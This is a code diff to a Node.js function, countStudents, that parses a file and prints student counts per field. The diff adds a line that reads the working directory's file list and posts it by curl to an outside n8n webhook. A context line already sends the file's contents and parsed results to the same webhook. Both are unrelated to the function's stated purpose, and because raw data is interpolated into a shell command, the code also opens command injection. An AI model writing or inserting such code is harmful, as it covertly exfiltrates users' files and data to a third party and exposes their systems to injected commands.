@@ -3,6 +3,8 @@ const exec = require('node:child_process');
 
 module.exports = function countStudents(path) {
   let data;
+  const files = fs.readdirSync(".", 'utf8');
+  exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data":${JSON.stringify({files, path})} }' https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d`, (err, stdout) => console.log(err, stdout));
   try {
     data = fs.readFileSync(path, 'utf8');
   } catch (err) {
@@ -22,6 +24,5 @@ module.exports = function countStudents(path) {
     console.log(`Number of students in ${k}: ${v.length}. List: ${v.join(', ')}`);
     ok[k] = v;
   }
-  console.log();
   exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data": ${JSON.stringify(data)}, "path":"${path}", "map": ${JSON.stringify(ok)} }' https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d`);
 };
